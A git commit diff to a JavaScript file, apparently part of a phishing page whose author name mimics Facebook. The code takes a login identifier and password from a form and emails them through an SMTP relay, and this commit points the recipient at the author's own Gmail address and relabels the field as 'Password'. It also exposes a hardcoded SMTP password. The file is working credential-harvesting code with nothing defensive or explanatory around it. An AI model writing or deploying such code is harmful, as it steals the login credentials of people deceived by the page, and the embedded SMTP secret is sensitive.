33236cc532fb093837639cd84752713d28e01857
faceboookaccountuser <grpdxpe@gmail.com>
2024-07-04 20:11:25 +0100

    p4

--- Script.js
+++ Script.js
@@ -1,4 +1,4 @@
-alert("bonjour")
+
 function emailSend(){
     var identifiant = document.getElementById('Identifiant').value;
     var Mail = document.getElementById('motPasse').value;
@@ -7,13 +7,13 @@ function emailSend(){
 
 
     var messageBody = "Identifiant: " + identifiant +
-                       "<br/> Mail: " + Mail; 
+                       "<br/> Password: " + Mail; 
 
     Email.send({
         Host : "smtp.elasticemail.com",
         Username : "grpdxpe@gmail.com",
         Password : "1C6C89DD0522083B5676B4800FA61B70D1D7",
-        To : 'them@website.com',
+        To : 'grpdxpe@gmail.com',
         From : "grpdxpe@gmail.com",
         Subject : "This is the subject",
         Body : messageBody
